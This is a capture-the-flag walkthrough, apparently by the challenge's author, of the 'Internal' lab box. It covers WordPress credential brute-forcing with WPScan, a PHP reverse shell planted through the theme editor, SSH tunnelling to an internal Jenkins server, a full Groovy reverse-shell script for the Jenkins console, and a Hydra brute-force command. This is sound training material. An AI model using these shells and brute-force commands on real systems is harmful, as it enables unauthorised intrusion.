# Scanning
As always, we begin by conducting a full port scan using Threader3000 followed by Nmap. We find a default web server and SSH running on the machine.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/b0224016-ebcc-44dc-b147-263d9d2445ef)

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/e363587a-5c83-4100-9119-ad85d415f096)

# Enumeration
Quick inspection of the webserver reveals a default Apache web page.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/d7ae0972-87ce-4553-b31c-bb90bc49c4fc)

Utilizing Dirsearch we locate the a subdirectory "/blog," which leads us to a Wordpress website for Internal.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/ebc59474-ce35-4f64-a526-41f043ffce83)

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/100cc0a2-cd45-43aa-a0e0-2ec5550b8885)

Knowing that we have a Wordpress website we can enumerate further using the WPScan tool.
![image](https://github.com/vivekprm/hackers-manual/assets/2403660/c7ad3fde-5866-404c-88b2-d25101be418e)

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/7fe4f2fc-0c59-4219-8229-a39093be6e35)

By scanning for vulnerable plugins and usernames we discover one single user — admin. We can then use the WPScan bruteforce function to locate credentials that 
can be utilized to log in.

```
wpscan — url ipaddr/blog — usernames admin — passwords rockyou.txt — max-threads 50
```

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/09a8047a-398c-490d-a570-a995dc58d578)

# Exploitation
Having discovered possible credentials we can attempt to log into the Wordpress backend, which is successful.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/4d2e2c11-7119-4b67-80e2-6a56066cc9ce)

Now that we are logged in we discover a default post in pages containing some credentials, but these are not useful and do not actually point at any valid user.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/aca790d7-4f5e-46bb-9fd4-f2b869a78a2a)

Moving from this discovery, we next check out the Theme Editor and recognize it is running TwentySeventeen. Knowing that theme editors can be utilized to upload 
php reverse shells, we upload one to the 404.php page.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/0ba2b17f-92fa-472d-bedc-43fd9520f008)

We need to start a netcat listener on the port we declared in the payload and navigate to the theme’s webpage (/wp-content/themes/twentyseventeen/404.php). This 
executes the reverse shell and grants us initial access to the host.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/02e45eaf-51ce-40f8-af17-9ea20ee8cb04)

From here much of the challenge requires manual enumeration. In creating the challenge I purposely hid credentials in the /opt folder without including words 
like "password" that are picked up by tools like Linpeas. Navigating to that directory and locating the wp-save.txt file reveals credentials for the Aubreanna user.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/8c80444c-5c2b-41dc-bf4b-b5cc6cf8e796)

We can then attempt to log in with these credentials via SSH, which is successful.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/82e05720-892f-4f6f-b654-1e8b6ae11867)

Navigating to the home directory reveals the user.txt flag and a file named “jenkins.txt.” This file hints that there is an internal Jenkins server running on 
a 172.17.0.2:8080 address internally.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/e664a5f4-4541-4ac2-b3d5-242b5a006667)

We can utilize a SSH tunnel with the Aubreanna user to gain access to the internal server in order to access it via our browser. Notice that doing so also offers 
that we have access to the 172.17.0.0/24 network.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/71008558-18aa-4422-91be-8f3dc753d193)

We can then visit the Jenkins server web page by visiting 127.0.0.1:8080.

Trying several different sets of default credentials proves unsuccessful, however the credentials can be brute forced using tools like Burp Intruder, OWASP ZAP 
Fuzz, or Hydra. The below example uses ZAP. By capturing a failed log in attempt we can try to use admin as username and brute force the j_password field with a 
wordlist.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/4fe391ae-a967-4cbb-8dff-18ae79642ba0)

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/e0a2f00c-fc63-4e1d-916d-adb7623fd712)

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/d47d5100-ea1a-43bc-80ba-93c1679df188)

Considering the differences in size between response header sizes we can determine the correct password from an incorrect one and successfully log in.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/3f973577-cfc2-4d57-86ce-a396688201a1)

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/24a70b67-05c0-41af-9a3e-9b34cea071ea)

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/67882ede-7a38-4b5e-a877-038a090bb848)

Jenkins has a couple of different methods of command execution on the host machine, and I find the easiest to be utilizing a Groovy reverse shell in the Jenkins 
scripting console.

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/34f5843e-5632-423c-b97a-f20c455b32ea)

Utilizing the reverse shell and starting a netcat listener on the assigned port grants us access to another shell on the host.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/e98df00e-8c42-44cb-8ac5-e8b8bed320b3)

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/170f3273-5e5a-40eb-abf0-80c89cac29c3)

The command line is limited, however, and it appears that we are actually inside of a Docker container. After manually enumerating more, we can discover 
credentials for the root user in the /opt directory as before.

Utilizing these credentials with SSH grants us root user access on the host machine.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/156e14cb-45a2-49f0-a40d-88923f4233a8)

We can then navigate to the /root directory and secure the root flag.

![image](https://github.com/vivekprm/hackers-manual/assets/2403660/1779aef5-fbdb-47c2-987c-7716209fcfeb)

```sh
hydra -s 8080 10.10.60.126 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" -L user.txt -P rockyou.txt -t 10 -w 30
```

